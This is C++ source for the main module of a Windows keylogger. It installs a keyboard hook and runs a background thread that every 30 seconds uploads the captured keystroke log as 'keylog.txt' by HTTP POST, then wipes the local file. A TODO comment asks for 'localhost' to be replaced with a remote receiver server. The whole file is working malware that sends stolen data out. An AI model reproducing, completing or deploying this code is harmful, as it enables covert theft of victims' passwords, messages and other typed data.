#include "hook.h"
#include <cstdio>

void clearFile(const char *filename)
{
    FILE *fp = fopen(filename, "w");
    if (!fp)
        return;
    fclose(fp);
}

void sendToApi(const std::string &filename)
{
    FILE *file = fopen(filename.c_str(), "rb");
    if (!file)
        return;

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    if (fileSize <= 0)
    {
        fclose(file);
        return;
    }

    std::string fileData(fileSize, '\0');
    size_t readSz = fread(&fileData[0], 1, fileSize, file);
    fclose(file);
    if (readSz != static_cast<size_t>(fileSize))
    {
        return;
    }

    const std::string boundary = "----KeyloggerMultipartFormUploadBoundary";
    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"keylog.txt\"\r\n";
    body += "Content-Type: text/plain\r\n\r\n";
    body += fileData;
    body += "\r\n--" + boundary + "--\r\n";

    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";

    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet)
        return;

    // TODO: Replace "localhost" with your server receiver endpoint
    HINTERNET hConnect = InternetConnect(hInternet, "localhost", INTERNET_DEFAULT_HTTP_PORT,
                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/upload", NULL,
                                         NULL, NULL, 0, 0);
    if (!hRequest)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    BOOL sent = HttpSendRequest(hRequest, contentType.c_str(), -1L,
                                (LPVOID)body.c_str(), body.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void startSendTimer(const char *filename, int intervalSeconds)
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));

        std::string data = readFile(filename);
        if (!data.empty())
        {
            sendToApi(filename);
            clearFile(filename);
        }
    }
}

int main()
{
    if (!installHook())
    {
        return 1;
    }

    std::thread senderThread(startSendTimer, LOG_FILE_PATH, 30);
    senderThread.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    uninstallHook();
    return 0;
}

